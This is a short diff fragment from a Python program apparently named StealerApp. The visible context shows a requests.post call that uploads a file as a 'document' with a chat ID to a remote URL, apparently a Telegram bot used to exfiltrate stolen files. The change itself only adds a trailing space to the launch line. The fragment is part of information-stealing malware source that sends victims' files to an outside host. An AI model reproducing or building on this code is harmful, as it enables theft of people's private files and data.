@@ -46,4 +46,4 @@ class StealerApp(App):
             requests.post(url, files={'document': f}, data={'chat_id': CHAT_ID})
 
 if __name__ == "__main__":
-    StealerApp().run()
+    StealerApp().run() 
